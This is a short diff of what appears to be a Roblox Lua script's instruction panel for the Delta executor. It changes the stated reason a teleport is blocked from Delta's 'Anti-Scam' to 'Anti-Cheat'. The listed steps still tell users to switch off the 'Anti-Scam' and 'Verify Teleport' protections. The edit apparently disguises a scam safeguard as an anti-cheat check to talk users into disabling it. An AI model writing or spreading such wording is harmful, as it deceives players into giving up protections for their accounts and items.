@@ -55,7 +55,7 @@ instructions.TextWrapped = true
 instructions.TextYAlignment = Enum.TextYAlignment.Top
 instructions.RichText = true
 instructions.Text = [[
-The script requires teleport permission, which is currently blocked by Delta's <font color="rgb(255,255,0)">Anti-Scam</font>.
+The script requires teleport permission, which is currently blocked by Delta's <font color="rgb(255,255,0)">Anti-Cheat</font>.
 1) Tap the Delta icon at the top.
 2) Open Settings (gear icon).
 3) Turn <font color="rgb(255,0,0)">OFF</font> the "<font color="rgb(255,255,0)">Anti-Scam</font>" & "<font color="rgb(0,180,255)">Verify Teleport</font>" option.
